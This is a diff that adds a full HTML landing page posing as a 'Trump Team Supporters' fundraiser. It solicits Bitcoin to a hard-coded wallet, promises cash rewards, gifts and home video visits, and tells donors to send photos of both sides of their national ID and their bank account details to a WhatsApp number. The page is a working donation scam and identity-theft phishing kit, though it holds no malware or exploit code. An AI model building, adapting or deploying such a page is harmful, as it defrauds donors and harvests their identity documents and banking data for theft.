@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Trump Team Supporters</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: #f2f7ff;
+            color: #111;
+            line-height: 1.5;
+            overflow-x: hidden;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        /* ===== HERO ===== */
+        .hero {
+            background: linear-gradient(135deg, #0b2e8a, #c80000);
+            color: #fff;
+            text-align: center;
+            padding: 40px 15px 30px;
+            position: relative;
+        }
+
+        .hero h1 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+            line-height: 1.2;
+        }
+
+        .hero p {
+            opacity: 0.9;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+
+        .hero .maga {
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+        .stripe {
+            height: 8px;
+            background: repeating-linear-gradient(
+                90deg,
+                red 0 25px,
+                white 25px 50px,
+                #0b2e8a 50px 75px
+            );
+            margin-top: 30px;
+        }
+
+        /* ===== WELCOME ===== */
+        .welcome {
+            background: #eaf3ff;
+            padding: 50px 15px;
+            text-align: center;
+        }
+
+        .welcome h2 {
+            font-size: 1.7rem;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+
+        .welcome h2 span {
+            color: red;
+        }
+
+        .welcome p {
+            max-width: 100%;
+            margin: 0 auto 20px;
+            line-height: 1.6;
+            font-size: 1rem;
+            padding: 0 10px;
+        }
+
+        .cta-btn {
+            margin-top: 25px;
+            padding: 16px 35px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: bold;
+            color: #fff;
+            cursor: pointer;
+            background: linear-gradient(135deg, #c80000, #0b2e8a);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            touch-action: manipulation;
+            min-height: 48px;
+            min-width: 44px;
+        }
+
+        .cta-btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        /* ===== BENEFITS ===== */
+        .benefits {
+            padding: 60px 15px;
+            text-align: center;
+            background: #fff;
+        }
+
+        .benefits h2 {
+            font-size: 1.7rem;
+            color: #0b2e8a;
+            margin-bottom: 10px;
+        }
+
+        .underline {
+            width: 60px;
+            height: 4px;
+            background: linear-gradient(90deg, red, gold);
+            margin: 0 auto 30px;
+            border-radius: 10px;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 16px;
+            padding: 25px 20px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+            border-top: 4px solid #0b2e8a;
+        }
+
+        .card i {
+            font-size: 40px;
+            color: #0b2e8a;
+            margin-bottom: 15px;
+        }
+
+        .card h3 {
+            color: #0b2e8a;
+            margin-bottom: 12px;
+            font-size: 1.3rem;
+        }
+
+        .card p {
+            line-height: 1.6;
+            color: #444;
+            font-size: 0.95rem;
+        }
+
+        /* ===== DONATION SECTION ===== */
+        .donation-section {
+            padding: 50px 15px;
+            background: #f8faff;
+            text-align: center;
+        }
+
+        .donation-section h3 {
+            color: #0b2e8a;
+            font-size: 1.5rem;
+            margin-bottom: 25px;
+        }
+
+        .wallet-container {
+            background: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 0 auto 25px;
+            max-width: 500px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            border: 1px solid #e0e7ff;
+        }
+
+        .wallet-address {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #f0f5ff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+
+        .copy-btn {
+            background: #0b2e8a;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: background 0.3s;
+            touch-action: manipulation;
+            min-height: 36px;
+            min-width: 36px;
+        }
+
+        .copy-btn:active {
+            background: #0951d9;
+        }
+
+        .copy-status {
+            display: block;
+            margin-top: 8px;
+            font-size: 0.85rem;
+            min-height: 20px;
+        }
+
+        /* ===== VERIFICATION INFO ===== */
+        .verification-info {
+            background: #fff3f3;
+            border-left: 4px solid #c80000;
+            padding: 20px;
+            margin: 25px auto;
+            max-width: 500px;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .verification-info p {
+            color: #333;
+            line-height: 1.6;
+            font-size: 0.95rem;
+        }
+
+        .whatsapp-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px auto;
+            padding: 16px 30px;
+            background: #25D366;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 6px 15px rgba(37, 211, 102, 0.3);
+            transition: all 0.3s ease;
+            touch-action: manipulation;
+            min-height: 48px;
+            min-width: 44px;
+        }
+
+        .whatsapp-btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 8px rgba(37, 211, 102, 0.3);
+        }
+
+        /* ===== FOOTER ===== */
+        .footer-top {
+            background: linear-gradient(135deg, #0b2e8a, #c80000);
+            padding: 30px 15px;
+            text-align: center;
+            color: #fff;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .footer {
+            background: #0b0b0b;
+            color: #ddd;
+            padding: 40px 15px;
+            text-align: center;
+        }
+
+        .footer h3 {
+            color: gold;
+            margin-bottom: 20px;
+            font-size: 1.3rem;
+        }
+
+        .socials {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0 30px;
+            flex-wrap: wrap;
+        }
+
+        .socials a {
+            width: 44px;
+            height: 44px;
+            background: #0b2e8a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            text-decoration: none;
+            transition: all 0.3s;
+            touch-action: manipulation;
+        }
+
+        .socials a:active {
+            transform: scale(0.95);
+            background: red;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (min-width: 768px) {
+            .hero {
+                padding: 60px 20px 40px;
+            }
+            
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+            
+            .welcome h2 {
+                font-size: 2rem;
+            }
+            
+            .welcome p {
+                max-width: 650px;
+            }
+            
+            .donation-section {
+                padding: 60px 20px;
+            }
+            
+            .verification-info {
+                padding: 25px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 1.5rem;
+            }
+            
+            .welcome h2 {
+                font-size: 1.4rem;
+            }
+            
+            .cta-btn, .whatsapp-btn {
+                width: 100%;
+                max-width: 280px;
+            }
+            
+            .wallet-address {
+                flex-direction: column;
+                gap: 10px;
+                text-align: center;
+            }
+        }
+
+        /* ===== SAFE AREA SUPPORT ===== */
+        @supports (padding: max(0px)) {
+            body {
+                padding-left: env(safe-area-inset-left);
+                padding-right: env(safe-area-inset-right);
+                padding-bottom: env(safe-area-inset-bottom);
+            }
+            
+            .hero, .welcome, .benefits, .donation-section, .footer {
+                padding-left: max(15px, env(safe-area-inset-left));
+                padding-right: max(15px, env(safe-area-inset-right));
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- HERO -->
+    <section class="hero">
+        <h1>Trump Team<br>Supporters</h1>
+        <p>United for a Stronger America</p>
+        <p class="maga">★ Make America Great Again ★</p>
+        <div class="stripe"></div>
+    </section>
+
+    <!-- WELCOME -->
+    <section class="welcome">
+        <h2>Welcome to <span>Trump<br>Team Supporters</span></h2>
+        <p>
+            Support Donald Trump from any country in the world. You can donate any amount, large or small, and every contribution is rewarded and makes a difference.
+        </p>
+        <button class="cta-btn" onclick="scrollToBenefits()">Join Our Movement</button>
+    </section>
+
+    <!-- BENEFITS -->
+    <section class="benefits" id="benefits">
+        <h2>Empowerment for All<br>Supporters</h2>
+        <div class="underline"></div>
+        <div class="card">
+            <i class="fa-solid fa-link"></i>
+            <h3>Benefit of Supporters</h3>
+            <p>
+                Your donation earns you both a cash reward and a physical gift from the Trump Foundation. if your 
+                location is USA our team will send some of our members to come and record a short celebratory 
+                video with you or alse Your full reward will be credited to your account within seven days.
+            </p>
+        </div>
+    </section>
+
+    <!-- DONATION SECTION -->
+    <section class="donation-section">
+        <h3>Donate with Bitcoin</h3>
+        <h5>make use of this Bitcoin wallet address</h5>
+        
+        <div class="wallet-container">
+            <div class="wallet-address" id="btc-wallet">
+                <span>bc1qafl59yp964uj3ac8uecvf8eujchj3rxzv5vzt8</span>
+                <button class="copy-btn" onclick="copyWalletAddress()" title="Copy to clipboard">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                    Copy
+                </button>
+            </div>
+            <small class="copy-status" id="copy-status"></small>
+        </div>
+
+        <!-- VERIFICATION INFORMATION (MOVED HERE) -->
+        <div class="verification-info">
+            <p>
+                <strong>Important:</strong> After you have donated, please click the WhatsApp button below and send the receipt along with pictures of the front and back of your national ID card and bank account details. This is to verify you for the Trump team.
+            </p>
+        </div>
+
+        <button class="whatsapp-btn" onclick="subscribe()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.76.982.998-3.675-.236-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.9 6.994c-.004 5.45-4.438 9.88-9.888 9.88m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.333.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.333 11.893-11.893 0-3.18-1.24-6.162-3.495-8.411" fill="white"/>
+            </svg>
+            WhatsApp
+        </button>
+    </section>
+
+    <!-- FOOTER TOP -->
+    <div class="footer-top">
+        - President Donald J. Trump
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <h3>Trump update</h3>
+        <div class="socials">
+            <a href="https://www.facebook.com/DonaldTrump" target="_blank" rel="noopener" aria-label="Facebook">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+            <a href="https://twitter.com/realDonaldTrump" target="_blank" rel="noopener" aria-label="Twitter">
+                <i class="fab fa-x-twitter"></i>
+            </a>
+            <a href="https://www.instagram.com/realdonaldtrump" target="_blank" rel="noopener" aria-label="Instagram">
+                <i class="fab fa-instagram"></i>
+            </a>
+            <a href="https://www.youtube.com/channel/UCYxRlFDqcWM4y7FfpiAN3KQ" target="_blank" rel="noopener" aria-label="YouTube">
+                <i class="fab fa-youtube"></i>
+            </a>
+        </div>
+       
+    </footer>
+
+    <script>
+        function copyWalletAddress() {
+            const walletAddress = 'bc1qafl59yp964uj3ac8uecvf8eujchj3rxzv5vzt8';
+            const statusElement = document.getElementById('copy-status');
+            const copyBtn = document.querySelector('.copy-btn');
+
+            navigator.clipboard.writeText(walletAddress).then(() => {
+                statusElement.textContent = '✓ Address copied to clipboard!';
+                statusElement.style.color = '#25D366';
+                copyBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg> Copied';
+                copyBtn.style.background = '#25D366';
+
+                setTimeout(() => {
+                    statusElement.textContent = '';
+                    copyBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy';
+                    copyBtn.style.background = '#0b2e8a';
+                }, 3000);
+            }).catch(err => {
+                statusElement.textContent = 'Failed to copy. Please select and copy manually.';
+                statusElement.style.color = '#ff4444';
+                setTimeout(() => {
+                    statusElement.textContent = '';
+                }, 3000);
+            });
+        }
+
+        function subscribe() {
+            const phoneNumber = '+15598808978';
+            const message = 'I have donated Bitcoin. Here is my receipt and ID verification:';
+            const whatsappUrl = `https://wa.me/${phoneNumber.replace('+', '')}?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, '_blank');
+        }
+
+        function scrollToBenefits() {
+            document.getElementById("benefits").scrollIntoView({ 
+                behavior: "smooth",
+                block: "start"
+            });
+        }
+
+        // Android-specific optimizations
+        if (/Android/i.test(navigator.userAgent)) {
+            document.addEventListener('DOMContentLoaded', function() {
+                // Prevent zoom on double-tap
+                let lastTouchEnd = 0;
+                document.addEventListener('touchend', function(event) {
+                    const now = (new Date()).getTime();
+                    if (now - lastTouchEnd <= 300) {
+                        event.preventDefault();
+                    }
+                    lastTouchEnd = now;
+                }, false);
+
+                // Improve button responsiveness
+                document.querySelectorAll('button').forEach(btn => {
+                    btn.addEventListener('touchstart', function() {
+                        this.style.transform = 'translateY(2px)';
+                    });
+                    btn.addEventListener('touchend', function() {
+                        this.style.transform = '';
+                    });
+                });
+            });
+        }
+    </script>
+</body>
+</html>
